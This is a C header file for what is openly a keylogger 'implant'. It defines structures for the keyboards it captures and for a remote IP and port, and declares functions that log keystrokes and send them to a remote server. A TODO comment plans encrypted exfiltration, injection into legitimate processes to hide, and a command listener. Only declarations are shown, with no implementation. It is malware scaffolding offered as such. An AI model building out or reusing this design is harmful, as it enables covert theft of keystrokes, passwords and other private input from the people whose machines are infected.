
#ifndef IMPLANT_H
#define IMPLANT_H

/*
    TODO:

    - add message_queue for each key logged
    - communication with remote server (& logging if debug!!)
    - add support for TLS communications / some kind of enc.
    - enumerate process to see which can be interesting to inject into
    - use ptrace-less process injection to inject this in a legit program
    - add listener to receive commands such as (sleep, enumeration, etc...)
*/


#include <sys/types.h>
#include <stdint.h>
#include <sys/queue.h>

#define QUEUE_BUFFER_SIZE 1024

#define STRING_BUFFER_SIZE 256

/*
    represents whatever data is currently logged for a single keyboard
    also holds its file descriptor
*/
typedef struct keyboard_s keyboard_t;
struct keyboard_s {
    int fd;

    ssize_t nb_chars;
    char buffer[QUEUE_BUFFER_SIZE];

    char name[STRING_BUFFER_SIZE];
    TAILQ_ENTRY(keyboard_s) devices;
};



/*
    contains project settings, such as target
    port & IP address, whether debug mode is enabled
    or stuff like this
*/
typedef struct implant_s {

    /* remote connection settings */
    unsigned short port;
    char ip[STRING_BUFFER_SIZE];
    int disable_net;

    /* keyboard settings */
    TAILQ_HEAD(listhead, keyboard_s) kbd;

} implant_t;


#define SUCCESSFUL 1
#define ERROR 0

#include <stdio.h> /* necessary for the dprintf in the macro */

#ifndef DEBUG_LOG
#define DEBUG_LOG(s, ...) \
    do { \
        dprintf(2, s, ##__VA_ARGS__); dprintf(2, "\n"); \
    } while (0)
#endif



#define KEY_PRESSED 1
#define KEY_RELEASED 0

// net.c
int init_remote_connection(implant_t *);
int send_key_description(int, char [STRING_BUFFER_SIZE]);

// opt.c
int parse_user_input(int, char **, implant_t *);

// logger.c
void keylog(implant_t *, int);

// keyboard.c
void fetch_available_keyboards(implant_t *);

// utils.c
int read_file(char const *, char **);
size_t get_array_size(uint8_t **);
char *remove_repeating_whitespaces(char *);
void free_tab(uint8_t **);
char **tabgen(const char *, char);


#endif /* IMPLANT_H */
